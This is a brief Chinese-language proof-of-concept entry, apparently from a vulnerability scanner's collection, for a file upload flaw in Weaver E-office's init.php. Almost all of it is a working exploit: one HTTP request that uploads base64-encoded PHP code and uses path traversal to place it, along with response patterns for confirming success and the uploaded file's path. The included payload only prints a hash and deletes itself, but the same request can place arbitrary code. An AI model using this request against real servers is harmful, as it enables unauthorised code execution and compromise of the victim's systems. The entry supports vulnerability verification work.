﻿# 泛微 E-office init.php 文件上传漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
GET /E-mobile/App/Init.php?m=createDo_Email&upload_file=PD9waHAgZWNobyBtZDUoMjMzKTt1bmxpbmsoX19GSUxFX18pPz4=&file_name=../testa123.php HTTP/1.1
```

> 响应代码特征：-1

> 响应内容特征：^(?=.*?(?:提交成功|新建成功)).*?$

> 上传文件定位：/attachment/testa123.php

> 验证文件来源：泛微 E-office init.php 文件上传漏洞.poc
